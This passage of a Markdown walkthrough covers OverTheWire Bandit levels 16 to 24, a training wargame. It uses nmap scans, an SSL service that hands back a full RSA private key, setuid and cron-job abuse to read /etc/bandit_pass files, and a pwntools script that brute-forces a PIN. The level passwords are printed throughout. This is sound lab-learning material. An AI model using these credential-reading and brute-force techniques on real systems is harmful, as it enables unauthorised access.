	    SRP username: None
	    TLS session ticket lifetime hint: 7200 (seconds)
	    TLS session ticket:
	    0000 - 56 e9 4e 87 6a 28 48 d0-13 42 5f b9 61 b0 dd d0   V.N.j(H..B_.a...
	    0010 - 07 6e 35 74 d7 08 a5 5f-05 f9 e7 c8 50 41 aa e3   .n5t..._....PA..
	    0020 - 41 44 55 da 16 5b af 64-17 39 7f 19 76 c7 f8 a3   ADU..[.d.9..v...
	    0030 - 7f 09 11 7f 42 8a cb 7d-18 0a 65 39 f4 0b 27 24   ....B..}..e9..'$
	    0040 - 5c 42 6d 8e 13 43 ac cc-dd d6 9a ec a4 43 25 1a   \Bm..C.......C%.
	    0050 - ab 6e 80 4e 78 f3 cd b8-96 00 ec 25 34 1a ee c6   .n.Nx......%4...
	    0060 - 58 f3 56 7a eb e7 f1 25-43 1b 78 28 b0 5d 50 7c   X.Vz...%C.x(.]P|
	    0070 - 3f 75 51 5a a5 a8 5d ac-c3 86 4e e6 1d a3 e8 4e   ?uQZ..]...N....N
	    0080 - fa d6 ba 5d 60 85 18 df-34 f5 35 7a 0b e5 f2 26   ...]`...4.5z...&
	    0090 - 00 28 f3 9e fb fc 62 7f-3b 23 0b 9f ed 3b 5d cc   .(....b.;#...;].
	
	    Start Time: 1587000304
	    Timeout   : 7200 (sec)
	    Verify return code: 18 (self signed certificate)
	    Extended master secret: yes
	---
	BfMYroe26WYalil77FoDi9qh59eK5xNr
	Correct!
	cluFn7wTiGryunymYOu4RcffSxQluehd
	
	closed
```

> ## FLAG:
>```bash
>	pwd: cluFn7wTiGryunymYOu4RcffSxQluehd
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level16"></a>Level 16 -> 17

> ```bash
> ssh bandit16@bandit.labs.overthewire.org -p 2220
> pwd: cluFn7wTiGryunymYOu4RcffSxQluehd
> 
> Level Goal
> 	The credentials for the next level can be
> 	retrieved by submitting the password of 
> 	the current level to a port on localhost in 
> 	the range 31000 to 32000. First find out which 
> 	of these ports have a server listening on 
> 	them. Then find out which of those speak SSL 
> 	and which don’t. There is only 1 server that 
> 	will give the next credentials, the others 
> 	will simply send back to you whatever you send 
> 	to it.
> ```

to IUSECover open ports on a device we use Nmap. the `-vvv` is that it shows us the infomation gatherd staright away rather then at the end. `-p 31000-32000` is the reange of ports we are interested in.

```bash

nmap -vvv localhost -p 31000-32000

	Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-16 03:44 CEST
	Initiating Ping Scan at 03:44
	Scanning localhost (127.0.0.1) [2 ports]
	Completed Ping Scan at 03:44, 0.00s elapsed (1 total hosts)
	Initiating Connect Scan at 03:44
	Scanning localhost (127.0.0.1) [1001 ports]
	IUSECovered open port 31790/tcp on 127.0.0.1
	Completed Connect Scan at 03:44, 1.24s elapsed (1001 total ports)
	Nmap scan report for localhost (127.0.0.1)
	Host is up, received conn-refused (0.00032s latency).
	Scanned at 2020-04-16 03:44:41 CEST for 2s
	Not shown: 999 closed ports
	Reason: 999 conn-refused
	PORT      STATE    SERVICE REASON
	31518/tcp filtered unknown no-response
	31790/tcp open     unknown syn-ack
	
	Read data files from: /usr/bin/../share/nmap
	Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```

Once we know the port which is open we then used openssl to connec to it. and providing it the password we are given a ssh private key.

```bash
openssl s_client -connect localhost:31790
	CONNECTED(00000003)
	depth=0 CN = localhost
	verify error:num=18:self signed certificate
	verify return:1
	depth=0 CN = localhost
	verify return:1
	---
	Certificate chain
	 0 s:/CN=localhost
	   i:/CN=localhost
	---
	Server certificate
	-----BEGIN CERTIFICATE-----
	MIICBjCCAW+gAwIBAgIEBKMOoTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
	b2NhbGhvc3QwHhcNMjAwNDA2MjIzMjQyWhcNMjEwNDA2MjIzMjQyWjAUMRIwEAYD
	VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBALags2qr
	lWfnM53o914J6CWEJ/gm8EnVrIzBRKUvWzHfiviUw9pcRDPb4sisxcrwts23fzh4
	LDGAuytnRxe5CeVmdJm+wNYK0tKR5FHwGgicDShmj+THsCiPRlF25jhgPZwKt2zs
	m5IFth2KrMI1PmBYpV7Kdomw/6E61Z6qIj1zAgMBAAGjZTBjMBQGA1UdEQQNMAuC
	CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
	ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
	DQEBBQUAA4GBAJBZ5d4MkQZi3o1aQYdcoqF5skeRHBiurIKzIruuAxY0A+3BY46J
	4HXHlslM0PAGnpSFVs0iEV3dgDtSW+pZECbycZpuZ5auOxkQ0on/2Zx0OXzQUbYP
	j4xvM1i8c8NpUqmFMcSn4ND+5nLI53ka6DE4PVfsxfPHa3IIJoV4yE9a
	-----END CERTIFICATE-----
	subject=/CN=localhost
	issuer=/CN=localhost
	---
	No client certificate CA names sent
	Peer signing digest: SHA512
	Server Temp Key: X25519, 253 bits
	---
	SSL handshake has read 1019 bytes and written 269 bytes
	Verification error: self signed certificate
	---
	New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
	Server public key is 1024 bit
	Secure Renegotiation IS supported
	Compression: NONE
	Expansion: NONE
	No ALPN negotiated
	SSL-Session:
	    Protocol  : TLSv1.2
	    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
	    Session-ID: 9C4872A69B8927728D5D7442FF986A6295BF116F1C2EF943085258C0B3BE2417
	    Session-ID-ctx: 
	    Master-Key: 47F3C610A0858AB4FCA528EA1EC619554C7AC5A3C4D07C1AE1D6F4A1AD34D806E641F19249E995A08563F5EFFFD2E3D4
	    PSK identity: None
	    PSK identity hint: None
	    SRP username: None
	    TLS session ticket lifetime hint: 7200 (seconds)
	    TLS session ticket:
	    0000 - 8e 9a 4d ec 1c f4 6b 35-30 ba 86 7d cf 4c 4a 6d   ..M...k50..}.LJm
	    0010 - e9 46 4f c7 14 8b 72 55-2d 05 f9 cd 59 93 9c 21   .FO...rU-...Y..!
	    0020 - f8 5b aa 5c 3a 7b b6 46-7b 41 0c 95 5d 79 1a 2b   .[.\:{.F{A..]y.+
	    0030 - 77 02 fe 81 62 e6 07 6b-1b 09 7b 3d 00 0d 6a 55   w...b..k..{=..jU
	    0040 - 07 59 55 cf 20 96 12 61-94 3e ce 0a 03 68 01 04   .YU. ..a.>...h..
	    0050 - 0a 00 ab c5 30 2d 78 e6-9f bb 0c bd 3f a1 81 bc   ....0-x.....?...
	    0060 - 9e 21 65 bd 20 90 49 1c-2f 55 6c c5 72 ae b2 85   .!e. .I./Ul.r...
	    0070 - fb 5f 1d 6a 1e e2 98 a8-da 04 8b b1 15 14 f8 9b   ._.j............
	    0080 - 0f 17 0b 39 a5 fb d9 3d-e9 c0 57 90 dd 23 6d 0f   ...9...=..W..#m.
	    0090 - 74 49 67 05 5b d4 8a 18-1c be c0 20 2e f5 70 d1   tIg.[...... ..p.
	
	    Start Time: 1587001621
	    Timeout   : 7200 (sec)
	    Verify return code: 18 (self signed certificate)
	    Extended master secret: yes
	---
	cluFn7wTiGryunymYOu4RcffSxQluehd
	Correct!
	-----BEGIN RSA PRIVATE KEY-----
	MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
	imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
	Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
	DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
	JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
	x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
	KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
	J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
	d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
	YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
	vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
	+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
	8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
	SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
	HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
	SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
	R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
	Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
	R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
	L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
	blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
	YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
	77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
	dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
	vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
	-----END RSA PRIVATE KEY-----
	
	closed
```
we then fist had to change the permission of the file 
```bash
	chmod 600 test.private 
```

the next step is then to login to level 17 with the private key.

```bash
ssh bandit17@localhost -i test.private
```

the next step is to recover the password for the current level.

```bash
cat /etc/bandit_pass/bandit17
	xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
```

> ## FLAG:
>```bash
>	pwd: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level17"></a>Level 17 -> 18

> ```bash
> ssh bandit17@bandit.labs.overthewire.org -p 2220
> pwd: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
> 
> Level Goal
> 	There are 2 files in the homedirectory:
> 	passwords.old and passwords.new. The password 
> 	for the next level is in passwords.new and is 
> 	the only line that has been changed between
> 	passwords.old and passwords.new
> 	
> 	NOTE: if you have solved this level and see
> 	‘Byebye!’ when trying to log into bandit18, 
> 	this is related to the next level, bandit19
> ```

here we have to use `diff` to compare the 2 files

```bash
diff passwords.new passwords.old 
	42c42
	< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
	---
	> hlbSBPAWJmL6WFDb06gpTx1pPButblOA
```

> ## FLAG:
>```bash
>	pwd: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level18"></a>Level 18 -> 19

> ```bash
> ssh bandit18@bandit.labs.overthewire.org -p 2220
> pwd: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
> 
> Level Goal
> 	The password for the next level is stored in 
> 	a file readme in the homedirectory.
> 	Unfortunately, someone has modified .bashrc 
> 	to log you out when you log in with SSH.
> ```

when we login to this level we automaticaly get logged out. we can provide a command when ssh into the server and that way we can retrieve the password from the file.

```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220  cat readme
	This is a OverTheWire game server. More
	information on
	http://www.overthewire.org/wargames

	bandit18@bandit.labs.overthewire.org's password: 
	IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

> ## FLAG:
>```bash
>	pwd: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level19"></a>Level 19 -> 20

> ```bash
> ssh bandit19@bandit.labs.overthewire.org -p 2220
> pwd: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
> 
> Level Goal
> 	To gain access to the next level, you should 
> 	use the setuid binary in the homedirectory.
> 	Execute it without arguments to find out how 
> 	to use it. The password for this level can 
> 	be found in the usual place (/etc/bandit_pass),
> 	after you have used the setuid binary.
> ```

we have been given a file which wen run sas that it will run a command as another user.

```bash
./bandit20-do 
	Run a command as another user.
	Example: ./bandit20-do id
```

we then see that it gives us a example on how to use this scipt.

```bash
./bandit20-do id
	uid=11019(bandit19) gid=11019(bandit19)
	euid=11020(bandit20) groups=11019(bandit19)
```

when we compare it to just running id
```bash
 id
	uid=11019(bandit19) gid=11019(bandit19)
	groups=11019(bandit19)
```

we notice that there is an extra `euid` in when running it with the script. this is a effective UID. this can be used to use a uid number from a different user.
in our case we can give the program any command and it will run it as Bandit20.

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

> ## FLAG:
>```bash
>	pwd: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level20"></a>Level 20 -> 21

> ```bash
> ssh bandit20@bandit.labs.overthewire.org -p 2220
> pwd: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
> 
> Level Goal
> 	There is a setuid binary in the homedirectory
> 	that does the following: it makes a connection 
> 	to localhost on the port you specify as a
> 	commandline argument. It then reads a line 
> 	of text from the connection and compares it 
> 	to the password in the previous level
> 	(bandit20). If the password is correct, it
> 	will transmit the password for the next 
> 	level (bandit21).
> 
> 	NOTE: Try connecting to your own network daemon
> 	to see if it works as you think
> ```

when we login we IUSECover that there is a script we can execute. when we run it we get the following response.

```bash
./suconnect 
	Usage: ./suconnect <portnumber>
	This program will connect to the given port on
	localhost using TCP. If it receives the correct
	password from the other side, the next password
	is transmitted back.
```

it tells us that the programm connects to a portnumber we have to provide it.

We can create a NetCat (nc) listener on a free port and then connect the script to it.

to have a nc listener running we have to open a second terminal and login as the same user.

```bash
nc -lvp 8888
	listening on [any] 8888 ...
```

in our case we have specified to have it run on port 8888.

now we connect the script to the just specified port.

```bash
./suconnect 8888

```
the program will be waiting for some input from the listener

we can now provide it with the password for the current level.

```bash
nc -lvp 8888
	listening on [any] 8888 ...
	connect to [127.0.0.1] from localhost [127.0.0.1] 42446
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
on the script terminal we get following response

```bash
./suconnect 8888
	Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
	Password matches, sending next password
```
it has compared the passwords and then send back the password for the next level.

```bash
nc -lvp 8888
	listening on [any] 8888 ...
	connect to [127.0.0.1] from localhost [127.0.0.1] 42446
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
	gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

> ## FLAG:
>```bash
>	pwd: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level21"></a>Level 21 -> 22

> ```bash
> ssh bandit21@bandit.labs.overthewire.org -p 2220
> pwd: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
> 
> Level Goal
> 	A program is running automatically at regular
> 	intervals from cron, the time-based job
> 	scheduler. Look in /etc/cron.d/ for the
> 	configuration and see what command is being
> 	executed.
> ```

the first step was to navigate into the directory they said we can inspect the different cronjobs running.
```bash
	cd /etc/cron.d
```
in there we see multiple files
```bash
ls -lash
	total 28K
	4.0K drwxr-xr-x  2 root root 4.0K Dec  4 01:58 .
	4.0K drwxr-xr-x 88 root root 4.0K Aug  3  2019 ..
	4.0K -rw-r--r--  1 root root  189 Jan 25  2017 atop
	4.0K -rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
	4.0K -rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
	4.0K -rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
	4.0K -rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

we see that there is a cronjob for Bandit22.
lets see what it contains.

```bash
cat cronjob_bandit22
	@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
	* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```
this tells us that this script is run every munute. aswell as it shares where it is located. lets see if we can read the script.

```bash
cat /usr/bin/cronjob_bandit22.sh 
	#!/bin/bash
	chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	cat /etc/bandit_pass/bandit22 >
		/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
here we can see that it is outputting the content into a temporay file.

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

> ## FLAG:
>```bash
>	pwd: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level22"></a>Level 22 -> 23

> ```bash
> ssh bandit22@bandit.labs.overthewire.org -p 2220
> pwd: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
> 
> Level Goal
> 	A program is running automatically at regular
> 	intervals from cron, the time-based job
> 	scheduler. Look in /etc/cron.d/ for the
> 	configuration and see what command is being
> 	executed.
> 
> 
> 	NOTE: Looking at shell scripts written by other
> 	people is a very useful skill. The script for
> 	this level is intentionally made easy to read.
> 	If you are having problems understanding what 
> 	it does, try executing it to see the debug
> 	information it prints.
> ```

the first step was to navigate into the directory they said we can inspect the different cronjobs running.
```bash
	cd /etc/cron.d
```
in there we see multiple files
```bash
ls -lash
	total 28K
	4.0K drwxr-xr-x  2 root root 4.0K Dec  4 01:58 .
	4.0K drwxr-xr-x 88 root root 4.0K Aug  3  2019 ..
	4.0K -rw-r--r--  1 root root  189 Jan 25  2017 atop
	4.0K -rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
	4.0K -rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
	4.0K -rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
	4.0K -rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

we see that there is a cronjob for Bandit22.
lets see what it contains.

```bash
cat cronjob_bandit23
	@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
	* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```
this tells us that this script is run every munute. aswell as it shares where it is located. lets see if we can read the script.

```bash
cat /usr/bin/cronjob_bandit23.sh 
	#!/bin/bash

	myname=$(whoami)
	mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

	echo "Copying passwordfile
		/etc/bandit_pass/$myname to /tmp/$mytarget"

	cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

lets see what `whoami` does.

```bash
whoami
	bandit22
```

we can see that user bandit23 for this file but when we will run it it will get the current username which would be bandit22 and therfor not giving us the right password.

lets see what happens when we change `$myname` to `bandit23`.

```bash
mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
$mytarget
	-bash: 8ca319486bfbbc3663ea0fbe81326349: command not found
```

we then get a md5 hash. lets see if we can use this hash to then retrieve the password.

```bash
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

> ## FLAG:
>```bash
>	pwd: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level23"></a>Level 23 -> 24

> ```bash
> ssh bandit22@bandit.labs.overthewire.org -p 2220
> pwd: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
> 
> Level Goal
> 	A program is running automatically at regular 
> 	intervals from cron, the time-based job scheduler. 
> 	Look in /etc/cron.d/ for the configuration and 
> 	see what command is being executed.
> 
> 	NOTE: This level requires you to create your own 
> 	first shell-script. This is a very big step and 
> 	you should be proud of yourself when you beat 
> 	this level!
> 
> 	NOTE 2: Keep in mind that your shell script is 
> 	removed once executed, so you may want to keep a 
> 	copy around…
> ```

the first step was to navigate into the directory they said we can inspect the different cronjobs running.
```bash
	cd /etc/cron.d
```
in there we see multiple files
```bash
ls -lash
	total 28K
	4.0K drwxr-xr-x  2 root root 4.0K Dec  4 01:58 .
	4.0K drwxr-xr-x 88 root root 4.0K Aug  3  2019 ..
	4.0K -rw-r--r--  1 root root  189 Jan 25  2017 atop
	4.0K -rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
	4.0K -rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
	4.0K -rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
	4.0K -rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

we see that there is a cronjob for Bandit22.
lets see what it contains.

```bash
cat cronjob_bandit24
	@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
	* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

now lets navigate to the file and see what it does.

```bash
cat /usr/bin/cronjob_bandit24.sh 
	#!/bin/bash

	myname=$(whoami)

	cd /var/spool/$myname
	echo "Executing and deleting all scripts in /var/spool/$myname:"
	for i in * .*;
	do
	    if [ "$i" != "." -a "$i" != ".." ];
    	then
		echo "Handling $i"
		timeout -s 9 60 ./$i
		rm -f ./$i
    	fi
	done
```

to be abel to get the password we will have to write our own script and then grab the password with it.

```bash
nano bandit24.sh 
	#!/bin/bash
	cat /etc/bandit_pass/bandit24 >> /tmp/user99/lv24
```

this will get what is stored in one file and pass it to the defined file.

we first had to give the file and folder permison to be able to be run from the cron job

```bash
	chmod 777 bandit24.sh
	cp bandit24.sh  /var/spool/bandit24/
	chmod 777 /tmp/user99
```

after waiting for a bit we can use `watch` to see when the new file is created

```bash
	watch -n 1 ls
```

we can see that the file `lv24` was created. lets get the content.

```bash
cat lv24 
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

> ## FLAG:
>```bash
>	pwd: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level24"></a>Level 24 -> 25

> ```bash
> ssh bandit24@bandit.labs.overthewire.org -p 2220
> pwd: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
> 
> Level Goal
> 	A daemon is listening on port 30002 and will give 
> 	you the password for bandit25 if given the password 
> 	for bandit24 and a secret numeric 4-digit pincode.
> 	There is no way to retrieve the pincode except by 
> 	going through all of the 10000 combinations, 
> 	called brute-forcing.
> ```

here the challenge was to bruteforce a 4digit pincode. this was not able to be done manualy due to the amount of combinations.

for this i did some research. and found a tool called `PWN-TOOLS`.

this is a script which makes multiple connections and trys the password. once it finds the right combo it will then stop.

```python
#!/usr/bin/python
from pwn import *
from multiprocessing import Process

def brute(nrOne,nrTwo):
    for pin in range(nrOne,nrTwo):
        pin = str(pin).zfill(4)

        r = remote('127.0.0.1', 30002)
        r.recv()
        r.send('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pin + '\n')

        if 'Wrong' not in r.recvline():
            print '[+] Successful -> ' + pin
            print r.recvline()
            r.close()
        else:
            if int(pin) % 100 == 0:
                print '[!] Failed -> ' + pin
            r.close()

if __name__=='__main__':
    p1 = Process(target = brute, args = (0,2500,))
    p2 = Process(target = brute, args = (2500,5000,))
    p3 = Process(target = brute, args = (5000,7500,))
    p4 = Process(target = brute, args = (7500,10000,))
    p1.start()
    p2.start()
    p3.start()
    p4.start()
   
OUTPUT from the Script:

python u.py SILENT=1
	[!] Failed -> 5000
	[!] Failed -> 2500
	[!] Failed -> 0000
	[!] Failed -> 7500
	[!] Failed -> 5100
	[!] Failed -> 0100
	[!] Failed -> 2600
	[!] Failed -> 7600
	[!] Failed -> 7500
	[!] Failed -> 5000
	[!] Failed -> 5100
	[!] Failed -> 7600
	[!] Failed -> 2500
	[!] Failed -> 2600
	[!] Failed -> 2500
	[!] Failed -> 2600
	[!] Failed -> 7600
	[!] Failed -> 5100
	[!] Failed -> 5000
	[!] Failed -> 5100
	[!] Failed -> 0000
	[!] Failed -> 2500
	[!] Failed -> 0100
	[!] Failed -> 2600
	[!] Failed -> 7500
	[!] Failed -> 2500
	[!] Failed -> 2600
	[!] Failed -> 5200
	[!] Failed -> 0200
	[!] Failed -> 2700
	[!] Failed -> 7700
	[!] Failed -> 5300
	[!] Failed -> 0300
	[!] Failed -> 2800
	[!] Failed -> 7800
	[!] Failed -> 5000
	[!] Failed -> 2500
	[!] Failed -> 5100
	[!] Failed -> 2600
	[!] Failed -> 5200
	[!] Failed -> 2700
	[!] Failed -> 2800
	[!] Failed -> 5300
	[!] Failed -> 0000
	[!] Failed -> 0100
	[!] Failed -> 7500
	[!] Failed -> 0200
	[!] Failed -> 2500
	[!] Failed -> 5000
	[!] Failed -> 7500
	[!] Failed -> 0300
	[!] Failed -> 7600
	[!] Failed -> 7700
	[!] Failed -> 7800
	[!] Failed -> 5400
	[!] Failed -> 0400
	[!] Failed -> 2900
	[!] Failed -> 7900
	[!] Failed -> 0000
	[!] Failed -> 0100
	[!] Failed -> 0200
	[!] Failed -> 0300
	[!] Failed -> 5000
	[!] Failed -> 0400
	[!] Failed -> 5100
	[!] Failed -> 7500
	[!] Failed -> 5200
	[!] Failed -> 7600
	[!] Failed -> 5300
	[!] Failed -> 5400
	[!] Failed -> 0000
	[!] Failed -> 7900
	[!] Failed -> 0100
	[!] Failed -> 0200
	[!] Failed -> 0300
	[!] Failed -> 0400
	[!] Failed -> 7500
	[!] Failed -> 5000
	[!] Failed -> 0400
	[!] Failed -> 5100
	[!] Failed -> 5200
	[!] Failed -> 5300
	[!] Failed -> 5000
	[!] Failed -> 0000
	[!] Failed -> 5400
	[!] Failed -> 2800
	[!] Failed -> 0100
	[!] Failed -> 2900
	[!] Failed -> 0200
	[!] Failed -> 0300
	[!] Failed -> 0400
	[!] Failed -> 5500
	[!] Failed -> 0500
	[!] Failed -> 3000
	[!] Failed -> 8000
	[!] Failed -> 5600
	[!] Failed -> 3100
	[!] Failed -> 0600
	[!] Failed -> 8100
	[!] Failed -> 5700
	[!] Failed -> 0700
	[!] Failed -> 3200
	[!] Failed -> 8200
	[!] Failed -> 5800
	[!] Failed -> 0800
	[!] Failed -> 3300
	[!] Failed -> 8300
	[!] Failed -> 5900
	[!] Failed -> 0900
	[!] Failed -> 3400
	[!] Failed -> 8400
	[!] Failed -> 6000
	[!] Failed -> 1000
	[!] Failed -> 3500
	[!] Failed -> 8500
	[!] Failed -> 6100
	[!] Failed -> 1100
	[!] Failed -> 3600
	[!] Failed -> 8600
	[!] Failed -> 6200
	[!] Failed -> 1200
	[!] Failed -> 3700
	[!] Failed -> 8700
	[!] Failed -> 6300
	[!] Failed -> 1300
	[!] Failed -> 8800
	[!] Failed -> 3800
	[!] Failed -> 6400
	[!] Failed -> 1400
	[!] Failed -> 8900
	[!] Failed -> 3900
	[!] Failed -> 6500
	[!] Failed -> 1500
	[!] Failed -> 9000
	[!] Failed -> 4000
	[!] Failed -> 6600
	[!] Failed -> 1600
	[!] Failed -> 9100
	[!] Failed -> 4100
	[!] Failed -> 6700
	[!] Failed -> 1700
	[!] Failed -> 9200
	[!] Failed -> 4200
	[!] Failed -> 6800
	[!] Failed -> 1800
	[!] Failed -> 9300
	[!] Failed -> 4300
	[!] Failed -> 6900
	[!] Failed -> 1900
	[!] Failed -> 9400
	[!] Failed -> 4400
	[+] Successful -> 9403
	The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

we casn see that the script ened after finding the right pincode. which in ourcase was 9403.


> ## FLAG:
>```bash
>	pwd: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level25"></a>Level 25 -> 26

> ```bash
> ssh bandit25@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> 
> Level Goal
